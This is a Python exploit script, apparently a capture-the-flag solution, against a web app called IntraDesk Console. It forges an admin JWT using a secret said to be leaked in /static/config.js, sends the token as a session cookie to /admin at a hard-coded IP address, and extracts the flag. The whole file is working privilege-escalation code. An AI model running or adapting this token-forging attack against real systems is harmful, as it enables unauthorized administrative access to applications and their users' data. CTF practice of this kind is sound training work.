#!/usr/bin/env python3
"""
IntraDesk Console CTF Challenge Exploit
========================================
This exploit demonstrates JWT role escalation vulnerability.

The application exposes its JWT secret key in /static/config.js,
allowing attackers to forge tokens with elevated privileges.
"""

import jwt
import time
import requests

# Target URL
BASE_URL = "http://13.53.139.173/web2"

# Leaked JWT secret from /static/config.js
JWT_SECRET = "intra-2026-dev-key"
JWT_ALGORITHM = "HS256"


def create_admin_token():
    """Create a forged JWT token with admin role."""
    payload = {
        "user": "admin",
        "role": "admin",
        "iat": int(time.time()),
        "exp": int(time.time()) + 3600  # 1 hour expiry
    }

    token = jwt.encode(payload, JWT_SECRET, algorithm=JWT_ALGORITHM)
    return token


def exploit():
    """Main exploit function."""
    print("[*] IntraDesk Console Exploit")
    print("[*] Vulnerability: JWT Secret Key Exposure + Role Escalation")
    print()

    # Step 1: Show the leaked secret
    print("[+] Step 1: Leaked JWT secret from /static/config.js")
    print(f"    Secret: {JWT_SECRET}")
    print(f"    Algorithm: {JWT_ALGORITHM}")
    print()

    # Step 2: Create forged admin token
    print("[+] Step 2: Forging admin JWT token...")
    admin_token = create_admin_token()
    print(f"    Token: {admin_token}")
    print()

    # Step 3: Access admin area
    print("[+] Step 3: Accessing /admin with forged token...")
    cookies = {"session": admin_token}
    response = requests.get(f"{BASE_URL}/admin", cookies=cookies)

    # Extract the flag from response
    if "flag{" in response.text:
        start = response.text.find("flag{")
        end = response.text.find("}", start) + 1
        flag = response.text[start:end]
        print(f"    [SUCCESS] Admin access granted!")
        print()
        print(f"[!] FLAG: {flag}")
    else:
        print("    [FAILED] Could not access admin area")
        print(response.text)


if __name__ == "__main__":
    exploit()
